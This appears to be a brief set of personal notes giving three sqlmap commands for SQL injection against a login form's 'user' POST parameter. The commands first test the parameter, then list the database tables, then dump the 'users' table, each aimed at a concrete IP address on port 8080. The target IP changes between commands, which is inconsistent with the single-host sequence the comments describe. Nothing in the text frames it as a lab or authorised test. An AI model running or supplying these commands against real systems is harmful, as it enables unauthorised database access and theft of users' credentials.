#Get Information and Enumerate, is the host vulnerable?
sqlmap -u "http://35.89.204.101:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST

# Yep!  Let's list the tables
sqlmap -u "http://35.24.89.206:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --tables

#Now that we know the table names, we can dump data

sqlmap -u "http://35.24.114.101:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --dump -T users
